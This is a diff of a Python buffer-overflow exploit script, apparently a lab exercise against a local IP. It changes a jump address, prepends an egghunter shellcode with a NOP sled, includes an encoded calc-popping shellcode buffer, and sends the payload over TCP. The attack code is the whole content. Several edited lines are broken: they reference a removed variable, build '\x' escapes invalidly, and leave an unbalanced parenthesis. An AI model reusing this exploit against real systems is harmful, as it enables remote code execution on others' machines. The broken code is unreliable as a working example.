@@ -6,10 +6,10 @@ pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
 
 # jmp esi Address
 
-jmpESI = "755ece45"
-ISEpmj = jmpESI[7:] + jmpESI[5:-2] + jmpESI[3:-4] + jmpESI[:-7]
+jmpESP = "77c9a320"
+PSEpmj = "\x"+jmpESI[7:] + "\x"+jmpESI[5:-2] + "\x"+jmpESI[3:-4] + "\x"+jmpESI[:-7]
 
-# egghunter (32byte) plus nop(8byte) fuer 40 byte + jmpESI little endian
+# egghunter (32byte) plus nop(8byte) fuer 40 byte + jmpESP little endian
 egghunter = "\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
 #egghunter canary + exploit (pop calc)
@@ -32,7 +32,7 @@ buf += b"\x4c\x21\x65\x92\xaf\x74\xf7\x06\x34\x1f\x3e\x5b\x70"
 buf += b"\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14\xf7\xa2\xc0"
 buf += b"\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7\xdf\xbd"
 
-payload= egghunter + ISEpmj
+payload= egghunter + PSEpmj
 
 # connection
 TCP_IP = '192.168.122.44'
@@ -50,7 +50,7 @@ time.sleep(1)
 #send exploit to message
 s.send(("A").encode())
 s.recv(BufferSize)
-s.send(("never gonna give you up").encode())
+s.send(("never gonna give you/here/this up").encode())
 s.recv(BufferSize)
 s.send(buf))
 time.sleep(1)
